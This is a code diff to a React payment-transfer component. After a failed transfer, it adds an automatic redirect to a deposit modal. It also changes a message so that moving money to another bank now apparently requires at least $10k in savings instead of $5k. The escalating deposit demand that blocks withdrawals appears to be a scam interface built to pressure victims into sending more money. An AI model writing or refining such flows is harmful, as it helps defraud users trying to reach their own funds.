@@ -73,6 +73,10 @@ function TransferPayment() {
         setError('Account name different from name registered');
         // Show savings modal when transfer fails
         setShowSavingsModal(true);
+        // Redirect to deposit modal after 5 seconds
+        setTimeout(() => {
+          openDepositModal();
+        }, 5000);
         return;
       }
 
@@ -221,7 +225,7 @@ function TransferPayment() {
             </div>
             <div className="modal-content">
               <div className="savings-message">
-                <p>Have $5k in savings account and get instant access to withdraw your checking balance into any account of your choice.</p>
+                <p>At least a minimum of $10k is required in your savings account to be able to transfer to a different bank account.</p>
               </div>
               <div className="modal-actions">
                 <button onClick={openDepositModal} className="deposit-btn">
